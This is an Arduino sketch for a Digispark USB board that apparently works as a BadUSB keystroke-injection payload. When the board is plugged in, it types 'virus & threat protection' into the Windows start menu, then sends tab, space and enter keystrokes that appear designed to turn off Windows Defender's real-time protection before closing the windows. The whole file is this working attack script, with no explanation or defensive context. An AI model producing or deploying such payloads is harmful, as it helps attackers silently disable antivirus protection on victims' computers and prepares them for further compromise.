#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("virus & threat protection");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(44);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(43,MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);    
  
}

void loop()
{}      
